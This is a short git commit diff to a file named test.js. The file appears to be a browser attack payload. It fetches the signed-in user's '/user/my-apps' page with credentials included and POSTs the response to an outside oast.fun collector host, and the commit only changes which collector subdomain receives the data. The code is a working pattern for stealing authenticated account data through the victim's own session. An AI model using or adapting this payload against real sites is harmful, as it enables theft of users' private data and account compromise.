16587c1c5f926109888412f1042eb1211611dc2a
steppe111 <56231146+steppe111@users.noreply.github.com>
2026-09-17 19:08:41 +0500

    Update test.js

--- test.js
+++ test.js
@@ -4,7 +4,7 @@
     const res  = await fetch('/user/my-apps', { credentials: 'include' });
     const data = await res.text();
 
-  await fetch('https://hsrjvzfyftnlzigkbkplqcrzy9etsscvd.oast.fun', {
+  await fetch('https://isnncovepnfctfdxbrknznkzlphgtmme3.oast.fun', {
   method: 'POST',
   mode: 'no-cors',
   body: JSON.stringify({
